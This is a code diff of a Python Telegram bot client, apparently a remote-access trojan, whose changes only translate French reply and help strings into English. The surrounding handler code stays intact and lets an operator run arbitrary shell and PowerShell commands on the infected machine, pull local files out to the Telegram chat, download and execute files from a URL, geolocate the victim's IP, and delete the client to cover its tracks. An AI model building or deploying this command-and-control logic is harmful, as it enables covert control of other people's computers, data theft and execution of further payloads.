@@ -23,25 +23,25 @@ def handle_message(message):
         command = text[5:]
         if command:
             output = execute_command(command)
-            bot.reply_to(message, f"Résultat de la commande sur {HOSTNAME}:\n{output}")
+            bot.reply_to(message, f"Result of command:\n{output}")
         else:
-            bot.reply_to(message, "Veuillez fournir une commande après !cmd")
+            bot.reply_to(message, "write command after !cmd")
 
     elif text.startswith('!shell'):
         command = text[7:]
         if command:
             output = execute_command(f"powershell -Command \"{command}\"")
-            bot.reply_to(message, f"Résultat de la commande PowerShell sur {HOSTNAME}:\n{output}")
+            bot.reply_to(message, f"Result of powershell command:\n{output}")
         else:
-            bot.reply_to(message, "Veuillez fournir une commande après !shell")
+            bot.reply_to(message, "write command after !shell")
 
     elif text.startswith('!upload'):
         file_path = text[7:].strip()
         if os.path.exists(file_path):
             with open(file_path, 'rb') as file:
-                bot.send_document(message.chat.id, file, caption=f"Fichier {file_path}")
+                bot.send_document(message.chat.id, file, caption=f"File {file_path}")
         else:
-            bot.reply_to(message, "Le fichier spécifié n'existe pas.")
+            bot.reply_to(message, "file does not exist.")
 
     elif text.startswith('!download'):
         file_url = text[10:].strip()
@@ -51,9 +51,9 @@ def handle_message(message):
             with open(file_name, 'wb') as file:
                 file.write(response.content)
             output = execute_command(file_name)
-            bot.reply_to(message, f"Résultat de l'exécution de {file_name} sur {HOSTNAME}:\n{output}")
+            bot.reply_to(message, f"Result of execution of {file_name}:\n{output}")
         else:
-            bot.reply_to(message, "Échec du téléchargement du fichier.")
+            bot.reply_to(message, "Error downloading file.")
 
     elif text.startswith('!ip'):
         response = requests.get('http://ip-api.com/json')
@@ -61,24 +61,24 @@ def handle_message(message):
             data = response.json()
             bot.reply_to(message, f"IP: {data['query']}\nCountry: {data['country']}\nCity: {data['city']}\nTimezone: {data['timezone']}")
         else:
-            bot.reply_to(message, "Échec de la récupération des informations IP.")
+            bot.reply_to(message, "Error get IP informations.")
 
     elif text.startswith('!kms'):
         os.remove(__file__)
-        bot.reply_to(message, "Fichier supprimé.")
+        bot.reply_to(message, "file deleted.")
 
     elif text == '!check':
-        bot.reply_to(message, f"Connecté - {HOSTNAME}")
+        bot.reply_to(message, f"Connected - {HOSTNAME}")
 
     elif text == '!help':
         help_text = (
-            "!cmd <commande> : Exécute une commande shell sur l'ordinateur et renvoie le résultat.\n"
-            "!shell <commande> : Exécute une commande PowerShell sur l'ordinateur et renvoie le résultat.\n"
-            "!upload <chemin_du_fichier> : Télécharge un fichier du chemin spécifié et l'envoie au groupe.\n"
-            "!download <url_du_fichier> : Télécharge un fichier depuis une URL spécifiée, l'exécute, et renvoie le résultat.\n"
-            "!ip : Récupère l'adresse IP publique de l'ordinateur.\n"
-            "!kms : Supprime le fichier client en cours d'exécution.\n"
-            "!check : Indique que le client est connecté et montre le nom d'hôte."
+            "!cmd <commande> : run commands.\n"
+            "!shell <commande> : run shell commands.\n"
+            "!upload <chemin_du_fichier> : download file (enter the file path).\n"
+            "!download <url_du_fichier> : download file from url and run it.\n"
+            "!ip : get ip info of client.\n"
+            "!kms : self delete client file.\n"
+            "!check : check if the client is connected."
         )
         bot.reply_to(message, help_text)
 
